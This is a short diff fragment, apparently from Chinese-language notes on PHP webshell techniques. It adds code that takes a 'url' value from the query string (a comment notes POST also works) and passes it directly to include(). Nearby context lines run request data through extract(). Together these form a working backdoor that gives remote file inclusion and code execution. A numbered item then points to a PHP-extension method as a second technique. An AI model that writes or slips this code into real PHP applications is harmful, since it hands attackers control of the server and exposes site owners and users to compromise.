@@ -41,6 +41,19 @@ function update($phpCode) {
 }
 extract(update($_REQUEST["c"]));
 
+function cc(){
+    global $b;
+    $a =$_GET[$b];  //此处可改成POST方式
+    $str =$a;
+    return $str;
+}
+?>
+<?php
+$b="url";
+$c=cc();
+$aa = $c;
+
+include($aa);
 
 2.使用php扩展
 https://github.com/phith0n/arbitrary-php-extension
